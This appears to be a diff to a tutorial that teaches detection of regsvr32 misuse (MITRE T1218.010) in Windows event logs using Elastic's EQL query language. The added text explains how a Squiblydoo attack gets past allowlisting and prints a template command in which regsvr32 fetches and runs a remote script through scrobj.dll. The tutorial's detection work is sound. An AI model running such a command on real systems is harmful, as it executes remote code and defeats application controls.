@@ -6,12 +6,26 @@
 experimental::[]
 
 This example tutorial shows you how you can use EQL to detect security threats
-and other suspicious behavior.
+and other suspicious behavior. In the scenario, you're tasked with detecting
+https://attack.mitre.org/techniques/T1218/010/[`regsvr32` misuse] in Windows
+event logs.
 
-In the scenario, you're tasked with detecting
-https://attack.mitre.org/techniques/T1218/010/[`regsvr32` misuse] in Windows event
-logs. `regsvr32` misuse is a known adversary technique documented in the
-https://attack.mitre.org[MITRE ATT&CK®] knowledge base.
+`regsvr32.exe` is a built-in command-line utility used to register `.dll`
+libraries in Windows. As a native tool, `regsvr32.exe` has a trusted status in
+Windows, letting it bypass most allowlist software and script blockers.
+Attackers with access to a user's command line can use `regsvr32.exe` to run
+malicious scripts using `.dll` libraries, even on machines that otherwise
+disallow such scripts.
+
+One common variant of `regsvr32` misuse is a
+https://attack.mitre.org/techniques/T1218/010/[Squiblydoo attack]. In a
+Squiblydoo attack, a `regsvr32.exe` command uses the `scrobj.dll` library to
+register and run a remote script. These commands often look like this:
+
+[source,sh]
+----
+"regsvr32.exe  /s /u /i:<script-url> scrobj.dll"
+----
 
 [discrete]
 [[eql-ex-threat-detection-setup]]
@@ -22,7 +36,7 @@ https://github.com/redcanaryco/atomic-red-team[Atomic Red Team]. The dataset has
 been normalized and mapped to use fields from the {ecs-ref}[Elastic Common
 Schema (ECS)], including the `@timestamp` and `event.category` fields. The
 dataset includes events that imitate behaviors related to `regsvr32` misuse, as
-documented by MITRE ATT&CK®.
+documented by the https://attack.mitre.org[MITRE ATT&CK®] knowledge base.
 
 To get started, download and index the dataset:
 
@@ -144,8 +158,7 @@ The query matches one process event. The event has an `event.type` of
 
 Based on the `process.command_line` value in the response, `regsvr32.exe` used
 `scrobj.dll` to register a script, `RegSvr32.sct`. This fits the behavior of a
-https://attack.mitre.org/techniques/T1218/010/["Squiblydoo" attack], a known
-variant of `regsvr32` misuse.
+Squiblydoo attack.
 
 The response also includes other valuable information about how the
 `regsvr32.exe` process started, such as the `@timestamp`, the associated
